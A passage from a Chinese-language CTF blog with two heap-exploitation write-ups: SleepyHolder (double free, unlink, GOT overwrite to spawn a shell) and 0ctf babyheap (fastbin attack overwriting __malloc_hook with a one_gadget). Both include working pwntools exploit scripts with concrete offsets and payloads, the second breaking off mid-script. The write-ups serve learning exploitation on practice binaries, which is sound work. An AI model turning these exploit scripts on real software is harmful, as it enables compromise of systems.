<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先keep一个small secret，然后keep一个big secret（防止wipe时small secret被merge到top_chunk中去），wipe small secret使其链入fastbin之后keep一个huge secret（trigger malloc_consolidate），这时small secret进入smallbins（并且big secret的prev_inuse位被更改，使得后续进行unlink利用），第二次wipe small secret，构成double free(主要是为了keep一次small secret之后big secret的prev_inuse不被更改，而又能对small secret进行操作)，代码&amp;heap图如下所示</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keep(<span class="number">1</span>,<span class="string">'aaaaaaaa'</span>)<span class="comment">#keep small secret</span></span><br><span class="line">keep(<span class="number">2</span>,<span class="string">'bbbbbbbb'</span>)<span class="comment">#keep big secret</span></span><br><span class="line">wipe(<span class="number">1</span>)<span class="comment">#wipe small</span></span><br><span class="line">keep(<span class="number">3</span>,<span class="string">'cccccccc'</span>)<span class="comment">#keep huge</span></span><br><span class="line">wipe(<span class="number">1</span>)<span class="comment">#wipe small Double freed now</span></span><br></pre></td></tr></table></figure>

<img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580473233821.png" width="50%" height="50%">

<p>接着keep small secret，填入一个fake chunk，接下来会wipe big secret，此时prev_inuse依然为0(因为fastbin里面的操作不会修改这个位)，会向后合并这个fake chunk并trigger unlink，为了绕过unlink的检测机制，我们现在在bss段上刚好有一个指向这个fake chunk的指针——small_ptr（即这个chunk data部分的指针），所以根据fd和bk指针的偏移，fake chunk填入的内容应该是p64(0)+p64(0x21)+p64(&amp;small_ptr-0x18)+p64(&amp;small_ptr-0x10)+p64(0x20)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f_ptr = <span class="number">0x6020d0</span><span class="comment">#small_ptr</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)<span class="comment">#fake chunk [prev_size,size]</span></span><br><span class="line">fake_chunk += p64(f_ptr - <span class="number">0x18</span>) + p64(f_ptr<span class="number">-0x10</span>)<span class="comment">#[fd,bk]</span></span><br><span class="line">fake_chunk += <span class="string">'\x20'</span><span class="comment">#fake [prev_size]</span></span><br><span class="line">keep(<span class="number">1</span>, fake_chunk,huge=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>接着wipe big secret，trigger unlink，因为对unlink暂时不是很熟，所以记录一下细节。如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wipe(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">unlink(AV, P, BK, FD)<span class="comment">//P是指向本chunk的指针,此时指向fake chunk，即small secret的data处</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line">    <span class="comment">//检查本chunk的size(0x20)和next chunk的prev_size(fake padding:0x20)是否相等</span></span><br><span class="line"></span><br><span class="line">	FD = P-&gt;fd;<span class="comment">//P+0x10 FD=0x6020b8(&amp;small_ptr-0x18)</span></span><br><span class="line">	BK = P-&gt;bk;<span class="comment">//P+0x18 BK=0x6020c0(&amp;small_ptr-0x10)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) </span><br><span class="line">        <span class="comment">//FD-&gt;bk=0x6020b8+0x18=0x6020d0(&amp;small_ptr)</span></span><br><span class="line">        <span class="comment">//BK-&gt;fd=0x6020c0+0x10=0x6020d0(&amp;small_ptr) check pass</span></span><br><span class="line">    	malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		FD-&gt;bk = BK;<span class="comment">//0x6020d0(small_ptr)=0x6020c0(big_ptr)</span></span><br><span class="line">		BK-&gt;fd = FD;<span class="comment">//0x6020d0(small_ptr)=0x6020b8(...)</span></span><br></pre></td></tr></table></figure>

<p>执行结束之后small_ptr指向0x6020b8，此时利用renew便可开始进行写</p>
<img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580475321718.png" width="60%" height="60%">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = p64(<span class="number">0</span>)<span class="comment">#padding</span></span><br><span class="line">f += p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT)<span class="comment">#big_ptr,huge_ptr,small_ptr</span></span><br><span class="line">f += p32(<span class="number">1</span>)<span class="comment">#Make big secret be using</span></span><br><span class="line">renew(<span class="number">1</span>, f)</span><br></pre></td></tr></table></figure>

<p>填充之后：</p>
<img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580477497059.png" width="60%" height="60%">

<p>接着利用renew将free_GOT改成puts_plt，然后调用wipe(big)时，即可输出atoi在GOT表的地址，计算出libc base之后（直接修改free_GOT为one_gadget我没成功，条件均不满足）使用<code>system(&quot;/bin/sh&quot;)</code> getshell，具体步骤如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">renew(<span class="number">1</span>, p64(puts_plt))<span class="comment">#make free_GOT-&gt;puts_plt</span></span><br><span class="line">wipe(<span class="number">2</span>)<span class="comment">#do puts(atoi_GOT)</span></span><br><span class="line"></span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x36e80</span><span class="comment">#atoi base</span></span><br><span class="line"></span><br><span class="line">renew(<span class="number">1</span>,p64(libc_base+<span class="number">0x45390</span>))<span class="comment">#make free_GOT-&gt;system</span></span><br><span class="line">keep(<span class="number">2</span>,<span class="string">'/bin/sh'</span>,huge=<span class="literal">False</span>)<span class="comment">#big_ptr-&gt;"/bin/sh"</span></span><br><span class="line">wipe(<span class="number">2</span>)<span class="comment">#do system(big_ptr)-&gt;system("/bin/sh")</span></span><br></pre></td></tr></table></figure>

<p>最终getshell</p>
<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'SleepyHolder'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep</span><span class="params">(size,content,huge=True)</span>:</span><span class="comment">#size:1 small,2 big,3 huge</span></span><br><span class="line">	p.recvuntil(<span class="string">'Renew secret\n'</span>)</span><br><span class="line">	p.send(<span class="string">'1'</span>)</span><br><span class="line">	<span class="keyword">if</span> huge:</span><br><span class="line">		p.recvuntil(<span class="string">'lock it forever\n'</span>)</span><br><span class="line">		p.send(str(size))</span><br><span class="line">		p.recvuntil(<span class="string">'secret: \n'</span>)</span><br><span class="line">		p.send(content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'Big secret\n'</span>)</span><br><span class="line">		p.send(str(size))</span><br><span class="line">		p.recvuntil(<span class="string">'secret: \n'</span>)</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Renew secret\n'</span>)</span><br><span class="line">	p.send(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Big secret\n'</span>)</span><br><span class="line">	p.send(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Renew secret\n'</span>)</span><br><span class="line">	p.send(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Big secret\n'</span>)</span><br><span class="line">	p.send(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'secret: \n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">keep(<span class="number">1</span>,<span class="string">'aaaaaaaa'</span>)<span class="comment">#keep small secret</span></span><br><span class="line">keep(<span class="number">2</span>,<span class="string">'bbbbbbbb'</span>)<span class="comment">#keep big secret</span></span><br><span class="line">wipe(<span class="number">1</span>)<span class="comment">#wipe small</span></span><br><span class="line">keep(<span class="number">3</span>,<span class="string">'cccccccc'</span>)<span class="comment">#keep huge</span></span><br><span class="line">wipe(<span class="number">1</span>)<span class="comment">#wipe small</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'Double free now'</span> + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f_ptr = <span class="number">0x6020d0</span><span class="comment">#small_ptr</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)<span class="comment">#fake chunk [prev_size,size]</span></span><br><span class="line">fake_chunk += p64(f_ptr - <span class="number">0x18</span>) + p64(f_ptr<span class="number">-0x10</span>)<span class="comment">#[fd,bk]</span></span><br><span class="line">fake_chunk += <span class="string">'\x20'</span><span class="comment">#fake prev_size</span></span><br><span class="line">keep(<span class="number">1</span>, fake_chunk,huge=<span class="literal">False</span>)<span class="comment">#</span></span><br><span class="line">wipe(<span class="number">2</span>)<span class="comment">#trigger Unlink</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'Unlink now'</span> + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">atoi_GOT = <span class="number">0x602080</span></span><br><span class="line">free_GOT = <span class="number">0x602018</span></span><br><span class="line">puts_GOT = <span class="number">0x602020</span></span><br><span class="line">puts_plt = <span class="number">0x400760</span></span><br><span class="line"></span><br><span class="line">f  = p64(<span class="number">0</span>)<span class="comment">#padding</span></span><br><span class="line">f += p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT)<span class="comment">#big_ptr,huge_ptr,small_ptr</span></span><br><span class="line">f += p32(<span class="number">1</span>)<span class="comment">#Make big secret be using</span></span><br><span class="line">renew(<span class="number">1</span>, f)</span><br><span class="line">renew(<span class="number">1</span>, p64(puts_plt))<span class="comment">#make free_GOT-&gt;puts_plt</span></span><br><span class="line">wipe(<span class="number">2</span>)<span class="comment">#do puts(atoi_GOT)</span></span><br><span class="line"></span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x36e80</span><span class="comment">#atoi base</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">renew(<span class="number">1</span>,p64(libc_base+<span class="number">0x45390</span>))<span class="comment">#free_GOT-&gt;system</span></span><br><span class="line">keep(<span class="number">2</span>,<span class="string">'/bin/sh'</span>,huge=<span class="literal">False</span>)<span class="comment">#big_ptr-&gt;"/bin/sh"</span></span><br><span class="line">wipe(<span class="number">2</span>)<span class="comment">#do system(big_ptr)-&gt;system("/bin/sh")</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/29/0ctfbabyheap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/01/29/0ctfbabyheap/" class="post-title-link" itemprop="url">0ctfbabyheap</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-01-29 08:12:29" itemprop="dateCreated datePublished" datetime="2020-01-29T08:12:29+08:00">2020-01-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-04-02 11:29:41" itemprop="dateModified" datetime="2020-04-02T11:29:41+08:00">2020-04-02</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/01/29/0ctfbabyheap/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/01/29/0ctfbabyheap/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0ctfbabyheap"><a href="#0ctfbabyheap" class="headerlink" title="0ctfbabyheap"></a>0ctfbabyheap</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2020/01/29/0ctfbabyheap/1580313525795.png" alt="1580313525795"></p>
<p>程序主要分为四个功能：Allocate,Fill,Free,Dump</p>
<h3 id="Allocate："><a href="#Allocate：" class="headerlink" title="Allocate："></a>Allocate：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580113992227.png" alt="1580113992227"></p>
<p>依次按照下标分配，最多为16个chunk，首先判断是否为using chunk，输入size后最大为0x1000，使用calloc分配空间（相较于malloc函数，calloc函数会自动将内存初始化为0）然后更新记录结构体的FLAG、size，content_ptr</p>
<h3 id="Fill："><a href="#Fill：" class="headerlink" title="Fill："></a>Fill：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580114274572.png" alt="1580114274572"></p>
<p>输入下标后判断下标是否在范围内，然后判断对应下标的记录结构体FLAG位是否是1（using or not），然后输入size，判断size是否大于0，然后直接输入，<strong>此处并未做输入大小检查</strong></p>
<h3 id="Free："><a href="#Free：" class="headerlink" title="Free："></a>Free：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580114435473.png" alt="1580114435473"></p>
<p>输入下标，判断是否在范围内，然后判断using or not，接着置记录结构体FLAG位为0，size为0，然后free掉content_ptr指针并置零</p>
<h3 id="Dump："><a href="#Dump：" class="headerlink" title="Dump："></a>Dump：</h3><p><img src="/2020/01/29/0ctfbabyheap/1580115008365.png" alt="1580115008365"></p>
<p>输入下标后判断是否在范围内，判断using or not，然后按记录的size打印内容</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h2><p>多calloc几个chunk之后可以利用Fill的漏洞修改相邻chunk的size还有内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 0 chunk 0</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 1 chunk 1</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 2 chunk 2</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 3 chunk 3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 4 chunk 4 Small chunk</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#index 5 Avoid merging into top_chunk</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>此时chunk 1,2位于fastbin中，且chunk 2的fd指向chunk 1，通过Fill chunk 0，可以达到修改chunk 2 fd，使其指向chunk 4，然后通过Fill chunk 3 修改chunk 4的size，避免fastbin attack时size不同而出错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)</span><br><span class="line">payload += p8(<span class="number">0xc0</span>)	 <span class="comment">#Low byte of chunk 4's address</span></span><br><span class="line">fill(<span class="number">0</span>, payload)	<span class="comment">#This payload only edit the fd of chunk 2</span></span><br><span class="line"></span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)	<span class="comment">#This payload edit the size of chunk 4</span></span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x20</span>)<span class="comment">#index 1  chunk 2 back</span></span><br><span class="line">alloc(<span class="number">0x20</span>)<span class="comment">#index 2  chunk 4</span></span><br></pre></td></tr></table></figure>

<p>然后再通过chunk 3修改chunk 4的大小，这样在free chunk 4 之后chunk 4的fd还有bk就会指向 main_arena</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)	<span class="comment">#recover 0x80</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)<span class="comment">#fd &amp; bk point to main_arena now</span></span><br></pre></td></tr></table></figure>

<p> 此时Dump chunk 2就可以获得 fd &amp; bk的值，从而获得libc base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x3c4b78</span> <span class="comment">#The offset of main_arena+... in libc</span></span><br></pre></td></tr></table></figure>

<p>此时可想办法利用__malloc_hook，将one_gadget填入，当__malloc_hook不为0时即可调用</p>
<p><img src="/2020/01/29/0ctfbabyheap/1580295721778.png" alt="1580295721778"></p>
<p>由于index 2此时指向的依然是chunk 4，我们可以对free掉的chunk 4的fd做修改，再次利用fastbin attack申请到一个包含<em>\</em>malloc_hook的堆块，不过此时要缩小其大小，让chunk 4的size在fast chunk之内</p>
<p>利用fastbin attack申请一个包含<em>\</em>malloc_hook的堆块需要对应的地方有合适的size</p>
<p><img src="/2020/01/29/0ctfbabyheap/1580296367287.png" alt="1580296367287"></p>
<p>当偏移加上0xd之后，利用此处的0x7f size来构造一个chunk，所以我们要将free后在usorted bin中的chunk 4分割，calloc(0x60)然后free之后即可利用chunk 3来修改其fd</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#0x80----&gt;0x70</span></span><br><span class="line">free(<span class="number">4</span>)     <span class="comment">#Set chunk to fastbin</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>, p64(libc_base + <span class="number">0x3c4aed</span>)) <span class="comment">#Fastbin attack target</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#index 4</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#index 6 get our target</span></span><br></pre></td></tr></table></figure>

<p>最后利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0x4526a</span>)<span class="comment">#one_gedget</span></span><br><span class="line">fill(<span class="number">6</span>, payload)<span class="comment">#Fill __malloc_hook </span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">255</span>)<span class="comment">#just call the function</span></span><br></pre></td></tr></table></figure>

<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./0ctfbabyheap'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(len(data)))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, data)</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span 